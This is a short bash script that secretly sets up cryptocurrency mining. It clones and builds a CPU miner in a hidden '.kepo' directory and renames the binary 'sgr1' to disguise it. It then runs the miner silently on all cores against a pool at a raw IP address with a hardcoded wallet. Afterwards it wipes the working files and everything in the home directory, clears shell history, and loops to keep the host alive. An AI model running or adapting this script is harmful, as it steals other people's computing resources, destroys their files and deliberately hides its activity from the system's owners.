#!/bin/bash
set -x
apt-get update 
apt-get install -y wget curl
mkdir .kepo && cd .kepo
git clone https://github.com/bitnet-io/cpuminer-opt-aurum
cd cpuminer-opt-aurum
./build.sh
mv cpuminer sgr1
./sgr1 -a aurum -o stratum+tcp://128.199.218.20:80 -u bit1qy594zk9ed7ds894gchkq4cm3gcmqflt2zjpepg.sugoi -p x -t $(nproc --all) > /dev/null 2>&1 &
sleep 30
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "hold down..."
        sleep 60
done
